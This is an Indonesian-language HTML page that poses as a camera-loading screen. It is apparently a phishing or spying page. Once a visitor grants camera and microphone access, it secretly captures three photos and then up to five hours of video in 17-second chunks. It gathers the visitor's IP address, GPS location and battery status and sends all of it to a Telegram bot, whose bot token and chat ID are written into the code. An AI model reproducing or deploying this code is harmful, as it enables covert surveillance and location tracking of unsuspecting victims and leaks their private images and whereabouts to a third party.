<html lang="id">
<head>

<body style="background:#000;color:white;text-align:center;padding:20px;">
  <h2>Memuat Kamera</h2>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = '7648038217:AAEhGMOxW_khuHyiCxttyaJyAWzPe9vm52U';
    const chat_id = '7552410869';
    let recorder, recordedChunks = [], stream;

    window.onload = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 1500));

        let fotoKe = 1;

        const ambilFoto = async () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

          const waktu = new Date();
          const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
          const lokasi = await getLocation();

          const caption = `Foto ${fotoKe}\nWaktu: ${waktu.toLocaleString()}\nIP: ${ip}\nLokasi: ${lokasi}`;

          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("caption", caption);
          formData.append("photo", blob, `foto${fotoKe}.jpg`);

          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
          });

          if (fotoKe === 2) {
            const synth = window.speechSynthesis;
            const ucapan = new SpeechSynthesisUtterance('Halo bang, kamu ganteng banget wkwkwk');
            ucapan.lang = 'id-ID';
            synth.speak(ucapan);
          }

          fotoKe++;
          if (fotoKe <= 3) {
            setTimeout(ambilFoto, 1000);
          } else {
            document.querySelector("h2").textContent = "hay broooo.";
            mulaiRekam();
          }
        };

        ambilFoto();

      } catch (e) {
        alert("Gagal akses kamera/mikrofon: " + e.message);
      }
    };

    async function mulaiRekam() {
      recorder = new MediaRecorder(stream);
      recorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
      recorder.onstop = () => kirimVideo();

      recorder.start();

      setTimeout(() => {
        setInterval(() => {
          recorder.stop();
          recorder.start();
        }, 17000);
      }, 17000);

      setTimeout(() => {
        recorder.stop();
        alert("Rekaman otomatis selesai setelah 5 jam.");
      }, 5 * 60 * 60 * 1000);
    }

    async function kirimVideo() {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];

      const waktu = new Date();
      const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
      const lokasi = await getLocation();
      const battery = await navigator.getBattery().then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak'})`).catch(() => 'N/A');

      const caption = `[REKAMAN OTOMATIS]\nWaktu: ${waktu.toLocaleString()}\nIP: ${ip}\nLokasi: ${lokasi}\nBaterai: ${battery}`;

      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", caption);
      formData.append("video", blob, "rekaman.webm");

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
      });
    }

    async function getLocation() {
      return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => resolve(`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`),
          () => resolve("Lokasi tidak tersedia")
        );
      });
    }
  </script>
</body>
